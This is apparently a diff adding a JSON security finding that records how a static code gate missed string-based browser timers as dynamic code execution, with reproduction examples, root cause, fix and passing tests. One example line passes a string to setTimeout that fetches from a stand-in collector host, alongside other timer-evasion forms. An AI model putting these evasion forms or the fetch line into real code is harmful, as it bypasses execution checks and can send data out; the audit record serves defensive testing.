@@ -1,0 +1,36 @@
+{
+  "findingId": "SEC-37-084",
+  "severity": "medium",
+  "title": "String-based browser timers bypassed dynamic-code execution checks",
+  "status": "fixed_locally",
+  "date": "2026-10-21",
+  "reproduction": {
+    "examples": [
+      "setTimeout('fetch(\"https://collector.invalid/data\")', 0);",
+      "window.setInterval('globalThis.tessellateProbe = true', 1000);",
+      "const schedule = window.setTimeout; schedule('globalThis.tessellateProbe = true', 0);",
+      "Reflect.apply(window.setTimeout, window, ['globalThis.tessellateProbe = true', 0]);"
+    ],
+    "beforeFix": "A global setTimeout call with a static source string returned pass. Browser string timers execute source as code even without a direct eval or Function call.",
+    "afterFix": "Static string arguments to global/window setTimeout and setInterval, aliased timer functions, call/apply forms, and Reflect.apply are classified as dynamic code execution. Function callbacks remain allowed."
+  },
+  "rootCause": "The source gate rejected eval and Function but omitted browser timer APIs that accept source strings as executable code.",
+  "affectedFiles": [
+    "packages/registry-gate/src/checks/isolation-check.ts",
+    "packages/registry-gate/src/__tests__/registry-gate.test.ts"
+  ],
+  "remediation": "Resolve timer function aliases and reflective references, then reject timer invocations whose first executable argument is statically a string without rejecting ordinary callback functions.",
+  "validation": {
+    "redBeforeFix": "pnpm exec vitest run packages/registry-gate/src/__tests__/registry-gate.test.ts -t \"string-based timer code execution\"",
+    "redBeforeFixResult": "failed as expected: the global setTimeout source string returned pass",
+    "targetedAfterFix": "pnpm exec vitest run packages/registry-gate/src/__tests__/registry-gate.test.ts -t \"string-based timer code execution\"",
+    "registryGateTests": "53 passed",
+    "fullUnitSuite": "1,178 tests passed across 76 files",
+    "typecheck": "22 workspace packages passed",
+    "lint": "0 errors and 33 warnings",
+    "releaseAudit": "16/16 behavioral gates, production builds, bundle budgets, provenance/security audits, and dependency audit passed",
+    "canonicalResourceIsolationMatrix": "324 resources scanned; zero security-isolation failures",
+    "untrustedCodeExecuted": false
+  },
+  "runtimeBoundary": "This is local static source-gate evidence. It does not replace deployed preview sandbox, CSP, or gateway verification."
+}
